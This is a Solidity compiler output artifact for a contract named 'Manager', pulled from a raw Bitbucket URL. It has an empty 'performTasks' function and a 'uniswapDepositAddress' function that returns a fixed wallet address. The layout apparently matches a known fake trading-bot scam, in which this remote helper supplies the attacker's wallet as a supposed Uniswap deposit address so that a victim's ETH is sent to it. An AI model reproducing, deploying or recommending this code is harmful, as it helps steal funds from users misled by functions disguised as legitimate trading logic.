{
	"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol": {
		"Manager": {
			"abi": [
				{
					"inputs": [],
					"name": "performTasks",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapDepositAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6779:6965  contract Manager {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6779:6965  contract Manager {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6779:6965  contract Manager {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6779:6965  contract Manager {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6799:6840  function performTasks() public {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6843:6963  function uniswapDepositAddress() public pure returns (address) {... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6799:6840  function performTasks() public {... */\n    tag_6:\n      jump\t// out\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6843:6963  function uniswapDepositAddress() public pure returns (address) {... */\n    tag_8:\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6897:6904  address */\n      0x00\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6917:6959  0xB70E72a70Eed1a2E2C0F1744aE9f1999eCa6cBC2 */\n      0xb70e72a70eed1a2e2c0f1744ae9f1999eca6cbc2\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6910:6959  return 0xB70E72a70Eed1a2E2C0F1744aE9f1999eCa6cBC2 */\n      swap1\n      pop\n        /* \"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol\":6843:6963  function uniswapDepositAddress() public pure returns (address) {... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220463ecc4ca8e2c9beeba455e75a7910239d6a1335c891b64c43556f31a129949964736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b600073b70e72a70eed1a2e2c0f1744ae9f1999eca6cbc290509056fea2646970667358221220463ecc4ca8e2c9beeba455e75a7910239d6a1335c891b64c43556f31a129949964736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0xB70E72A70EED1A2E2C0F1744AE9F1999ECA6CBC2 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CHAINID RETURNDATACOPY 0xCC 0x4C 0xA8 0xE2 0xC9 0xBE 0xEB LOG4 SSTORE 0xE7 GAS PUSH26 0x10239D6A1335C891B64C43556F31A129949964736F6C63430006 MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "43800",
						"executionCost": "93",
						"totalCost": "43893"
					},
					"external": {
						"performTasks()": "122",
						"uniswapDepositAddress()": "225"
					}
				},
				"methodIdentifiers": {
					"performTasks()": "0c0f93a1",
					"uniswapDepositAddress()": "feae9ad3"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}